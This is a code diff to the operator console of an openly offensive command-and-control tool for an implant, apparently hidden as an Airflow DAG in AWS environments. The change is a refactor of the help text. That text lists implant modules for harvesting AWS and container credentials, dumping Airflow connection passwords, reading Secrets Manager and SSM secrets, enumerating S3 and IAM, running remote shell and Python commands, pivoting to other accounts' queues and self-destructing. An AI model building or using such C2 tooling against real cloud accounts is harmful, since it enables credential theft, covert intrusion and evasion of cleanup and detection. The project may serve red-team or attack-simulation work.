@@ -15,7 +15,6 @@ Components:
 
 import base64
 import json
-import shlex
 import time
 from typing import Optional
 
@@ -237,44 +236,41 @@ def operator_console(
     Provides a command prompt to send commands to the implant and
     automatically polls for results.
     """
+    def _print_help():
+        print()
+        print("  Shell Commands:")
+        print("    <any command>         - Execute shell command on implant")
+        print("    python:<code>         - Execute inline Python on implant")
+        print()
+        print("  Built-in Modules (executed natively in the implant):")
+        print("    !harvest-creds        - Harvest AWS creds, IMDS, env vars, container creds")
+        print("    !airflow-dump         - Dump connections (with passwords), variables, pools")
+        print("    !s3-recon             - Enumerate S3 buckets, sample objects, read policies")
+        print("    !secrets              - List & read Secrets Manager secrets")
+        print("    !ssm-params           - List & read SSM Parameter Store (with decryption)")
+        print("    !iam-enum             - Enumerate role, attached/inline policies")
+        print("    !network-recon        - Network interfaces, routes, VPCs, subnets, SGs, IMDS")
+        print("    !self-destruct        - Remove the implant DAG and cached .pyc files")
+        print()
+        print("  File Operations:")
+        print("    !read-file <path>     - Read a file from the worker filesystem")
+        print("    !write-file <p> <b64> - Write base64 content to a file on the worker")
+        print()
+        print("  Advanced:")
+        print("    !pivot <acct> <queue> <msg> - Send a message to another account's queue")
+        print("    !multi                - Send multiple commands (newline-separated, end with empty line)")
+        print()
+        print("  Console:")
+        print("    !results              - Poll for pending results")
+        print("    !drain                - Drain all pending results (keep polling until empty)")
+        print("    !help                 - Show this help")
+        print("    !quit                 - Exit the operator console")
+        print()
+
     print_section("C2 Operator Console")
     print_info(f"Command queue:  {attacker.queue_url(cmd_queue)}")
     print_info(f"Results queue:  {attacker.queue_url(results_queue)}")
-    print()
-    print("  Shell Commands:")
-    print("    <any command>         - Execute shell command on implant")
-    print("    python:<code>         - Execute inline Python on implant")
-    print()
-    print("  Built-in Modules (executed natively in the implant):")
-    print("    !harvest-creds        - Harvest AWS creds, IMDS, env vars, container creds")
-    print("    !airflow-dump         - Dump connections (with passwords), variables, pools")
-    print("    !s3-recon             - Enumerate S3 buckets, sample objects, read policies")
-    print("    !secrets              - List & read Secrets Manager secrets")
-    print("    !ssm-params           - List & read SSM Parameter Store (with decryption)")
-    print("    !iam-enum             - Enumerate role, attached/inline policies")
-    print("    !network-recon        - Network interfaces, routes, VPCs, subnets, SGs, IMDS")
-    print("    !self-destruct        - Remove the implant DAG and cached .pyc files")
-    print()
-    print("  File Operations:")
-    print("    !read-file <path>     - Read a file from the worker filesystem")
-    print("    !write-file <p> <b64> - Write base64 content to a file on the worker")
-    print()
-    print("  Advanced:")
-    print("    !pivot <acct> <queue> <msg> - Send a message to another account's queue")
-    print("    !multi                - Send multiple commands (newline-separated, end with empty line)")
-    print()
-    print("  Console:")
-    print("    !results              - Poll for pending results")
-    print("    !drain                - Drain all pending results (keep polling until empty)")
-    print("    !help                 - Show this help")
-    print("    !quit                 - Exit the operator console")
-    print()
-
-    # Commands that are sent directly to the implant (implant has native handlers)
-    IMPLANT_BUILTINS = {
-        "!harvest-creds", "!airflow-dump", "!s3-recon", "!secrets",
-        "!ssm-params", "!iam-enum", "!network-recon", "!self-destruct",
-    }
+    _print_help()
 
     while True:
         try:
@@ -292,8 +288,7 @@ def operator_console(
             break
 
         if user_input == "!help":
-            operator_console.__doc__ and None  # re-print help
-            print("  Type any command above or a shell command to send to the implant.")
+            _print_help()
             continue
 
         if user_input == "!results":
